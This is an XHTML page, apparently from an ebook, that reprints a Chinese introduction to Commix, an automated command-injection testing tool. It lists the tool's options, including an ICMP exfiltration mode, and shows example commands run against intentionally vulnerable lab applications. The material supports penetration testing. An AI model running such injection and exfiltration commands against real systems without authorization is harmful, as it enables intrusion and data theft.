@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>系统命令注入漏洞自动化测试工具 – Commix</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>系统命令注入漏洞自动化测试工具 – Commix</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI2MzA3OTgxOA==&amp;mid=400998229&amp;idx=1&amp;sn=409dcf69bf0769e821f7df303a1c91ea&amp;chksm=78534db04f24c4a6d30fbfcf7e170b29ead2e4da5e07f491dbc7a63b0f9380e9c9d18c675a2c&amp;scene=126&amp;sessionid=1681404956#rd">http://mp.weixin.qq.com/s?__biz=MzI2MzA3OTgxOA==&amp;mid=400998229&amp;idx=1&amp;sn=409dcf69bf0769e821f7df303a1c91ea&amp;chksm=78534db04f24c4a6d30fbfcf7e170b29ead2e4da5e07f491dbc7a63b0f9380e9c9d18c675a2c&amp;scene=126&amp;sessionid=1681404956#rd</a></blockquote><p style=""><span style="box-sizing: border-box; font-weight: 700;">Commix是一个适用于web开发者、渗透测试人员及安全研究者的自动化测试工具，可以帮助他们更高效的发现web应用中的命令注入攻击相关漏洞。Commix由Python编写。</span></p><p style=""><span style="box-sizing: border-box; font-weight: 700;">环境要求</span><br style="box-sizing: border-box;"/>Python 2.6.x或2.7.x</p><p style=""><span style="box-sizing: border-box; font-weight: 700;">安装</span><br style="box-sizing: border-box;"/>下载git clone https://github.com/stasinopoulos/commix.git commix</p><p style=""><span style="box-sizing: border-box; font-weight: 700;">使用</span></p><p style=""><span style="box-sizing: border-box; font-weight: 700;">基本使用</span></p><pre class="prettyprint lang-html prettyprinted" style="">Usage: python commix.py [options]</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">选项</span></p><pre class="prettyprint lang-html prettyprinted" style="">-h, --help Show help and exit.
+--verbose             Enable the verbose mode.
+--install             Install &amp;#039;commix&amp;#039; to your system.
+--version             Show version number and exit.
+--update              Check for updates (apply if any) and exit.</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">目标</span></p><pre class="prettyprint lang-html prettyprinted" style="">--url=URL           Target URL.
+--url-reload        Reload target URL after command execution.</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">请求</span></p><pre class="prettyprint lang-html prettyprinted" style="">--host=HOST         HTTP Host header.
+--referer=REFERER   HTTP Referer header.
+--user-agent=AGENT  HTTP User-Agent header.
+--cookie=COOKIE     HTTP Cookie header.
+--headers=HEADERS   Extra headers (e.g. &amp;#039;Header1:Value1\nHeader2:Value2&amp;#039;).
+--proxy=PROXY       Use a HTTP proxy (e.g. &amp;#039;127.0.0.1:8080&amp;#039;).
+--auth-url=AUTH_..  Login panel URL.
+--auth-data=AUTH..  Login parameters and data.
+--auth-cred=AUTH..  HTTP Basic Authentication credentials (e.g.
+                    &amp;#039;admin:admin&amp;#039;).</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">注入</span></p><pre class="prettyprint lang-html prettyprinted" style="">--data=DATA         POST data to inject (use &amp;#039;INJECT_HERE&amp;#039; tag).
+--suffix=SUFFIX     Injection payload suffix string.
+--prefix=PREFIX     Injection payload prefix string.
+--technique=TECH    Specify a certain injection technique : &amp;#039;classic&amp;#039;,
+                    &amp;#039;eval-based&amp;#039;, &amp;#039;time-based&amp;#039; or &amp;#039;file-based&amp;#039;.
+--maxlen=MAXLEN     The length of the output on time-based technique
+                    (Default: 10000 chars).
+--delay=DELAY       Set Time-delay for time-based and file-based
+                    techniques (Default: 1 sec).
+--base64            Use Base64 (enc)/(de)code trick to prevent false-
+                    positive results.
+--tmp-path=TMP_P..  Set remote absolute path of temporary files directory.
+--icmp-exfil=IP_..  Use the ICMP exfiltration technique (e.g.
+                    &amp;#039;ip_src=192.168.178.1,ip_dst=192.168.178.3&amp;#039;).</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">测试示例</span></p><p style=""><span style="box-sizing: border-box; font-weight: 700;">测试漏洞web应用Damn </span></p><pre class="prettyprint lang-html prettyprinted" style="">python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&amp;submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">使用注入攻击Payload参数测试php-Charts 1.0</span></p><pre class="prettyprint lang-html prettyprinted" style="">python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="//" --suffix="&amp;#039;"</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">使用特殊的头和HTTP代理测试OWASP Mutillidae</span></p><pre class="prettyprint lang-html prettyprinted" style="">python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"</pre><p style=""><span style="box-sizing: border-box; font-weight: 700;">使用ICMP渗漏（exfiltration）技术测试Persistence</span></p><pre class="prettyprint lang-html prettyprinted" style="">su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""</pre><p style=""><br/></p><p><br/></p>
+        
+</body>
+</html>
